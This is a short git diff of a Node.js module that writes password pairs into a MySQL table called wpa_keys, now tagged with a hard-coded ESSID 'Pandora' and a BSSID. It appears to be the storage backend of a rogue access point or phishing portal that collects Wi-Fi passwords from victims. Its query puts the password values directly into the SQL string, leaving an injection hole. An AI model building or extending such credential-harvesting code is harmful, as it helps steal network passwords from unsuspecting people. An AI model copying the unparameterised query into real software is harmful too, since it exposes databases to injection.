@@ -1,5 +1,8 @@
 var mysql = require('mysql');
 
+const essid = "Pandora"
+const bssid = "AB:CD:EF:12:34:56"
+
 function ConectarDB() {
     var connection = mysql.createConnection({
         host: 'localhost',
@@ -24,7 +27,7 @@ function InsertData(pass1, pass2) {
     var connection = ConectarDB();
     return new Promise((resolve, reject) => {
         var query = connection.query(`
-        INSERT INTO wpa_keys VALUES ('${pass1}', '${pass2}')
+        INSERT INTO wpa_keys (ESSID, BSSID, psw1, psw2) VALUES ('${essid}', '${bssid}', '${pass1}', '${pass2}')
         `, function(err) {
             if(err) {
                 reject('Error en la consulta')
